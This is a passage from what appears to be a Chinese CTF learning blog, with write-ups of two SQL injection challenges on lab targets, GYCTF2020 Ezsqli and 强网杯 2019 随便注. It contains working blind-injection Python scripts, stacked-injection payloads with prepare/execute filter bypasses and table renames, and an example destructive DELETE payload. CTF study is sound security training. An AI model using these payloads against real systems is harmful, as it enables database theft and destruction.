class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>) :<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            database_name=database_name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>,i,<span class="hljs-string">&quot;个字符： &quot;</span>,database_name)<br>            <span class="hljs-keyword">break</span> <br></code></pre></td></tr></table></figure><blockquote><p>获取到数据库信息之后开始获取数据库内的表名，在测试的时候发现information_schema被过滤了，那就尝试下mysql.innodb_table_stats(mysql默认关闭InnoDB存储引擎)一样不行，那就只能百度了，看网上采用的是sys.x$schema_flattened_keys（需要版本&gt;5.7且只能查询表明，使用方法与information_schema类似）  </p></blockquote><p>我这个环境只有sys.x$schema_flattened_keys能用，有的wp用sys.schema_table_statistics_with_buffer，我这没测出来<br>求表名(写这步卡了我一个小时):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;,-./0123456789:;&lt;&gt;=?@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://72f05b95-5f5b-4315-94d1-fb6b35544ce8.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    time.sleep(<span class="hljs-number">0.05</span>) <br>    payload = <span class="hljs-string">&quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;全表名长度:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span> <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        time.sleep(<span class="hljs-number">0.05</span>) <br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名:&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>到求列名，因为information_schema被过滤，sys.schema_table_statistics_with_buffer又并没有储存列名，并且这里过滤了 union 所以我们无法使用常规的<strong>无列名注入</strong><br>如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;<br></code></pre></td></tr></table></figure><p>更详细<br><a href="https://blog.csdn.net/qq_71467825/article/details/134655702">https://blog.csdn.net/qq_71467825/article/details/134655702</a></p><p>先判断表的列数</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>&amp;&amp;((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>) &gt; (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p>知道列数为2，那第一列大概率是id或序列号啥的，猜测flag在2  </p><p>为什么不能直接用盲注呢，应该是以为没法用selec group_concat(列名)，因为没有能查列名的表，所以不知道列名。</p><p>那看大佬们的wp，就是用比大小，ascii码大的就大。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;a&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">0</span><br> <br> <br> <br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;b&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">1</span><br> <br>这里能发现 是通过比对 首个字符的ascii 如果相同 就输出 <span class="hljs-number">0</span> <br><br>不同就输出 <span class="hljs-number">1</span><br> 前一个 ascii  和 后一个ascii 值的大小<br> 如果前一个比较大 那么就输出<span class="hljs-number">0</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>kinsey973.github.io<span class="hljs-operator">/</span><span class="hljs-number">2024</span><span class="hljs-operator">/</span><span class="hljs-number">06</span><span class="hljs-operator">/</span><span class="hljs-number">08</span><span class="hljs-operator">/</span>GYCTF2020<span class="hljs-operator">-</span>Ezsqli<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p>利用该方法拿到flag</p><p>最后的脚本又写了一个小时，想死了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://39c20ccd-935c-44d7-9446-f5fb806c3f12.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    f=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.08</span>)<br>        f=flag + <span class="hljs-built_in">chr</span>(s)<br>        payload = <span class="hljs-string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(f)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag.lower)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后出来的flag全是大写，我看别人的wp也是大写要转小写，不知道什么原因</p><p>结束  </p><p>一道题看着别人的wp复现了近3个半小时，菜的发瘟，写脚本脑子跟不上，做题起步难没经验，到底哪天能独立解出一道这种web题啊<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p><p>复现的wp:<br><a href="https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/">https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/</a><br><a href="https://www.cnblogs.com/upfine/p/16556520.html">https://www.cnblogs.com/upfine/p/16556520.html</a><br><a href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-20</title>
    <link href="/2025/03/28/note-20/"/>
    <url>/2025/03/28/note-20/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="强网杯 2019 随便注"></a>强网杯 2019 随便注</h1><p>上次做这题还是两个月前，好像也是这题坚定了我打基础的原因，虽然现在看还是得看大佬们的wp<br>但以前是wp都看不明白<br>先是数字传参，<br>注入点</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">inject</span>=1&#x27;#<br></code></pre></td></tr></table></figure><p>尝试</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>回显  </p><p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p><p>尝试</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">1</span>&#x27;or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,database()))  # <br></code></pre></td></tr></table></figure><p>成功回显<br>error 1105 : XPATH syntax error: ‘!supersqli’</p><p>好像能用报错，但是select被过滤了呀🤡</p><p>尝试了<br>双写绕过<br>使用URL编码<br>&lt;&gt;绕过<br>无果  </p><p>只能看wp了吗<br><a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a><br>原wp写的是真的好，详细透彻</p><p>使用堆叠注入，查看数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>然后是查看表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables from supersqli;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">回显：</span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>查看字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show colums from &quot;1919810931114514&quot;;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">没法回显</span><br><span class="hljs-string"></span><br><span class="hljs-string">改为</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;1919810931114514&#x27;</span>;#<br><br>不行<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;#</span><br><span class="hljs-string"></span><br><span class="hljs-string">成功回显:</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(2) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(1) &quot;1&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(7) &quot;hahahah&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">  [0]=&gt;</span><br><span class="hljs-string">  string(4) &quot;flag&quot;</span><br><span class="hljs-string">  [1]=&gt;</span><br><span class="hljs-string">  string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">  [2]=&gt;</span><br><span class="hljs-string">  string(2) &quot;NO&quot;</span><br><span class="hljs-string">  [3]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">  [4]=&gt;</span><br><span class="hljs-string">  NULL</span><br><span class="hljs-string">  [5]=&gt;</span><br><span class="hljs-string">  string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><blockquote><p>注意，如果tableName是纯数字，需要用<code>包裹，比如1&#39;;desc </code>1919810931114514&#96;;#</p></blockquote><p>原来是 &#96; 而不是 ‘ 🤡</p><p>到这步骤就有多种方法解题了  </p><h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>通过预编译的方式拼接select 关键字：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;prepare hack from concat(&#x27;</span>sele<span class="hljs-string">&#x27;,&#x27;</span>ct<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`<span class="hljs-string">&#x27;);execute hack;#</span><br></code></pre></td></tr></table></figure><p>得flag{f2078443-bdad-4914-b367-e6691fd333c5}</p><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><blockquote><p>将select * from <code>1919810931114514</code>语句进行16进制编码<br>73656c656374202a2066726f6d20603139313938313039333131313435313460</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="hljs-string">或者定义一个变量名</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">Set</span> <span class="hljs-variable">@jia</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">PREPARE</span> hacker <span class="hljs-keyword">from</span> <span class="hljs-variable">@jia</span>;<span class="hljs-keyword">EXECUTE</span> hacker;#<br></code></pre></td></tr></table></figure><p>看情况用把，我觉得能用预编译的话，那很多都能解决了</p><h2 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h2><blockquote><p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# </span><br><span class="hljs-string">然后直接</span><br><span class="hljs-string">1&#x27;</span>; <span class="hljs-keyword">or</span> ture<br>查看所有字段拿到flag<br></code></pre></td></tr></table></figure><p>666，改不了查询语句就改表名，思路太开阔了，</p><p>这里要注意:<br>我在自己尝试的时候没有将换表名和改字段的操作一条语句完成，我是先改的words to words1，导致了源码sql查询语句的查words出错，后面将flag表改成words的操作无法传入，一切后续操作失效，这时sql语句查询的words，但是现在已经没有words这个表了，原sql语句就用不了了，永远报错，应该是相当于这个靶机废了；</p><h2 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h2><blockquote><p>此题还可以通过handle直接出答案：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure><h1 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h1><hr><h2 id="0x01-堆叠注入原理"><a href="#0x01-堆叠注入原理" class="headerlink" title="0x01 堆叠注入原理"></a>0x01 堆叠注入原理</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h2 id="0x02-预编译"><a href="#0x02-预编译" class="headerlink" title="0x02 预编译"></a>0x02 预编译</h2><blockquote><p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,  </p></blockquote><p>我理解是先写好sql语句命令，然后执行，类似编程语言里的定义函数或类？<br>预编译命令用法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 